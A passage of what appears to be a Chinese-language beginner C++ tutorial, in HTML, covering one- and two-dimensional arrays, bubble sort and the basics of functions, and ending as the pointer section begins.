class="string">&quot;数组首地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)arr &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;数组中第一个元素地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;arr[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;数组中第二个元素地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;arr[<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//arr = 100; 错误，数组名是常量，因此不可以赋值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：数组名是常量，不可以赋值</p>
</blockquote>
<blockquote>
<p>总结1：直接打印数组名，可以查看数组所占内存的首地址</p>
</blockquote>
<blockquote>
<p>总结2：对数组名进行sizeof，可以获取整个数组占内存空间的大小</p>
</blockquote>
<p><strong>练习案例1</strong>：五只小猪称体重</p>
<p><strong>案例描述：</strong></p>
<p>在一个数组中记录了五只小猪的体重，如：int arr[5] &#x3D; {300,350,200,400,250};</p>
<p>找出并打印最重的小猪体重。</p>
<p><strong>练习案例2：</strong>数组元素逆置</p>
<p><strong>案例描述：</strong>请声明一个5个元素的数组，并且将元素逆置.</p>
<p>(如原数组元素为：1,3,2,5,4;逆置后输出结果为:4,5,2,3,1);</p>
<h4 id="5-2-3-冒泡排序"><a href="#5-2-3-冒泡排序" class="headerlink" title="5.2.3 冒泡排序"></a>5.2.3 冒泡排序</h4><p><strong>作用：</strong> 最常用的排序算法，对数组内元素进行排序</p>
<ol>
<li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li>
<li>对每一对相邻元素做同样的工作，执行完毕后，找到第一个最大值。</li>
<li>重复以上的步骤，每次比较次数-1，直到不需要比较</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541905327273.png"
                      alt="1541905327273"
                ></p>
<p><strong>示例：</strong> 将数组 { 4,2,8,0,5,7,1,3,9 } 进行升序排序</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> arr[<span class="number">9</span>] = &#123; <span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">9</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span> - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span> - <span class="number">1</span> - i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> temp = arr[j];</span><br><span class="line">				arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">				arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="5-3-二维数组"><a href="#5-3-二维数组" class="headerlink" title="5.3 二维数组"></a>5.3 二维数组</h3><p>二维数组就是在一维数组上，多加一个维度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541905559138.png"
                      alt="1541905559138"
                ></p>
<h4 id="5-3-1-二维数组定义方式"><a href="#5-3-1-二维数组定义方式" class="headerlink" title="5.3.1 二维数组定义方式"></a>5.3.1 二维数组定义方式</h4><p>二维数组定义的四种方式：</p>
<ol>
<li><code>数据类型  数组名[ 行数 ][ 列数 ];</code></li>
<li><code>数据类型  数组名[ 行数 ][ 列数 ] = &#123; &#123;数据1，数据2 &#125; ，&#123;数据3，数据4 &#125; &#125;;</code></li>
<li><code>数据类型  数组名[ 行数 ][ 列数 ] = &#123; 数据1，数据2，数据3，数据4&#125;;</code></li>
<li><code> 数据类型  数组名[  ][ 列数 ] = &#123; 数据1，数据2，数据3，数据4&#125;;</code></li>
</ol>
<blockquote>
<p>建议：以上4种定义方式，利用&#x3D;&#x3D;第二种更加直观，提高代码的可读性&#x3D;&#x3D;</p>
</blockquote>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//方式1  </span></span><br><span class="line">	<span class="comment">//数组类型 数组名 [行数][列数]</span></span><br><span class="line">	<span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">	arr[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	arr[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">	arr[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">	arr[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">4</span>;</span><br><span class="line">	arr[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">	arr[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//方式2 </span></span><br><span class="line">	<span class="comment">//数据类型 数组名[行数][列数] = &#123; &#123;数据1，数据2 &#125; ，&#123;数据3，数据4 &#125; &#125;;</span></span><br><span class="line">	<span class="type">int</span> arr2[<span class="number">2</span>][<span class="number">3</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">		&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//方式3</span></span><br><span class="line">	<span class="comment">//数据类型 数组名[行数][列数] = &#123; 数据1，数据2 ,数据3，数据4  &#125;;</span></span><br><span class="line">	<span class="type">int</span> arr3[<span class="number">2</span>][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//方式4 </span></span><br><span class="line">	<span class="comment">//数据类型 数组名[][列数] = &#123; 数据1，数据2 ,数据3，数据4  &#125;;</span></span><br><span class="line">	<span class="type">int</span> arr4[][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：在定义二维数组时，如果初始化了数据，可以省略行数</p>
</blockquote>
<h4 id="5-3-2-二维数组数组名"><a href="#5-3-2-二维数组数组名" class="headerlink" title="5.3.2 二维数组数组名"></a>5.3.2 二维数组数组名</h4><ul>
<li>查看二维数组所占内存空间</li>
<li>获取二维数组首地址</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//二维数组数组名</span></span><br><span class="line">	<span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">		&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组大小： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组一行大小： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组元素大小： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组行数： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组列数： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) / <span class="built_in">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//地址</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组首地址：&quot;</span> &lt;&lt; arr &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组第一行地址：&quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组第二行地址：&quot;</span> &lt;&lt; arr[<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组第一个元素地址：&quot;</span> &lt;&lt; &amp;arr[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二维数组第二个元素地址：&quot;</span> &lt;&lt; &amp;arr[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结1：二维数组名就是这个数组的首地址</p>
</blockquote>
<blockquote>
<p>总结2：对二维数组名进行sizeof时，可以获取整个二维数组占用的内存空间大小</p>
</blockquote>
<h4 id="5-3-3-二维数组应用案例"><a href="#5-3-3-二维数组应用案例" class="headerlink" title="5.3.3 二维数组应用案例"></a><strong>5.3.3 二维数组应用案例</strong></h4><p><strong>考试成绩统计：</strong></p>
<p>案例描述：有三名同学（张三，李四，王五），在一次考试中的成绩分别如下表，<strong>请分别输出三名同学的总成绩</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>语文</th>
<th>数学</th>
<th>英语</th>
</tr>
</thead>
<tbody><tr>
<td>张三</td>
<td>100</td>
<td>100</td>
<td>100</td>
</tr>
<tr>
<td>李四</td>
<td>90</td>
<td>50</td>
<td>100</td>
</tr>
<tr>
<td>王五</td>
<td>60</td>
<td>70</td>
<td>80</td>
</tr>
</tbody></table>
<p><strong>参考答案：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> scores[<span class="number">3</span>][<span class="number">3</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">		&#123;<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>&#125;,</span><br><span class="line">		&#123;<span class="number">90</span>,<span class="number">50</span>,<span class="number">100</span>&#125;,</span><br><span class="line">		&#123;<span class="number">60</span>,<span class="number">70</span>,<span class="number">80</span>&#125;,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	string names[<span class="number">3</span>] = &#123; <span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += scores[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; names[i] &lt;&lt; <span class="string">&quot;同学总成绩为： &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h2 id="6-函数"><a href="#6-函数" class="headerlink" title="6 函数"></a>6 函数</h2><h3 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h3><p><strong>作用：</strong>将一段经常使用的代码封装起来，减少重复代码</p>
<p>一个较大的程序，一般分为若干个程序块，每个模块实现特定的功能。</p>
<h3 id="6-2-函数的定义"><a href="#6-2-函数的定义" class="headerlink" title="6.2 函数的定义"></a>6.2 函数的定义</h3><p>函数的定义一般主要有5个步骤：</p>
<p>1、返回值类型 </p>
<p>2、函数名</p>
<p>3、参数表列</p>
<p>4、函数体语句 </p>
<p>5、return 表达式</p>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名 （参数列表）</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">       函数体语句</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span>表达式</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<ul>
<li>返回值类型 ：一个函数可以返回一个值。在函数定义中</li>
<li>函数名：给函数起个名称</li>
<li>参数列表：使用该函数时，传入的数据</li>
<li>函数体语句：花括号内的代码，函数内需要执行的语句</li>
<li>return表达式： 和返回值类型挂钩，函数执行完后，返回相应的数据</li>
</ul>
<p><strong>示例：</strong>定义一个加法函数，实现两个数相加</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = num1 + num2;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="6-3-函数的调用"><a href="#6-3-函数的调用" class="headerlink" title="6.3 函数的调用"></a>6.3 函数的调用</h3><p><strong>功能：</strong>使用定义好的函数</p>
<p><strong>语法：</strong><code> 函数名（参数）</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span> <span class="comment">//定义中的num1,num2称为形式参数，简称形参</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = num1 + num2;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line">	<span class="comment">//调用add函数</span></span><br><span class="line">	<span class="type">int</span> sum = <span class="built_in">add</span>(a, b);<span class="comment">//调用时的a，b称为实际参数，简称实参</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sum = &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	a = <span class="number">100</span>;</span><br><span class="line">	b = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	sum = <span class="built_in">add</span>(a, b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sum = &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：函数定义里小括号内称为形参，函数调用时传入的参数称为实参</p>
</blockquote>
<h3 id="6-4-值传递"><a href="#6-4-值传递" class="headerlink" title="6.4 值传递"></a>6.4 值传递</h3><ul>
<li>所谓值传递，就是函数调用时实参将数值传入给形参</li>
<li>值传递时，&#x3D;&#x3D;如果形参发生，并不会影响实参&#x3D;&#x3D;</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换前：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num1 = &quot;</span> &lt;&lt; num1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num2 = &quot;</span> &lt;&lt; num2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> temp = num1;</span><br><span class="line">	num1 = num2;</span><br><span class="line">	num2 = temp;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换后：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num1 = &quot;</span> &lt;&lt; num1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num2 = &quot;</span> &lt;&lt; num2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//return ; 当函数声明时候，不需要返回值，可以不写return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">swap</span>(a, b);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mian中的 a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mian中的 b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结： 值传递时，形参是修饰不了实参的</p>
</blockquote>
<h3 id="6-5-函数的常见样式"><a href="#6-5-函数的常见样式" class="headerlink" title="6.5 函数的常见样式"></a><strong>6.5 函数的常见样式</strong></h3><p>常见的函数样式有4种</p>
<ol>
<li>无参无返</li>
<li>有参无返</li>
<li>无参有返</li>
<li>有参有返</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数常见样式</span></span><br><span class="line"><span class="comment">//1、 无参无返</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//void a = 10; //无类型不可以创建变量,原因无法分配内存</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is test01&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//test01(); 函数调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、 有参无返</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is test02&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、无参有返</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is test03 &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、有参有返</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test04</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is test04 &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="type">int</span> sum = a + b;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="6-6-函数的声明"><a href="#6-6-函数的声明" class="headerlink" title="6.6 函数的声明"></a>6.6 函数的声明</h3><p><strong>作用：</strong> 告诉编译器函数名称及如何调用函数。函数的实际主体可以单独定义。</p>
<ul>
<li>函数的<strong>声明可以多次</strong>，但是函数的<strong>定义只能有一次</strong></li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明可以多次，定义只能一次</span></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="built_in">max</span>(a, b) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="6-7-函数的分文件编写"><a href="#6-7-函数的分文件编写" class="headerlink" title="6.7 函数的分文件编写"></a>6.7 函数的分文件编写</h3><p><strong>作用：</strong>让代码结构更加清晰</p>
<p>函数分文件编写一般有4个步骤</p>
<ol>
<li>创建后缀名为.h的头文件  </li>
<li>创建后缀名为.cpp的源文件</li>
<li>在头文件中写函数的声明</li>
<li>在源文件中写函数的定义</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//swap.h文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现两个数字交换的函数声明</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//swap.cpp文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;swap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main函数文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;swap.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line">	<span class="built_in">swap</span>(a, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>













<h2 id="7-指针"><a href="#7-指针" class="headerlink" title="7 指针"></a>7 指针</h2><h3 id="7-1-指针的基本概念"><a href="#7-1-指针的基本概念" class="headerlink" title="7.1 指针的基本概念"></a>7.1 指针的基本概念</h3><p><strong>指针的作用：</strong> 可以通过指针间接访问内存</p>
<ul>
<li>内存编号是从0开始记录的，一般用十六进制数字表示</li>
<li>可以利用指针变量保存地址</li>
</ul>
<h3 id="7-2-指针变量的定义和使用"><a href="#7-2-指针变量的定义和使用" class="headerlink" title="7.2 指针变量的定义和使用"></a>7.2 指针变量的定义和使用</h3><p>指针变量定义语法： <code>数据类型 * 变量名；</code></p>
<p><strong>示例：</strong></p>
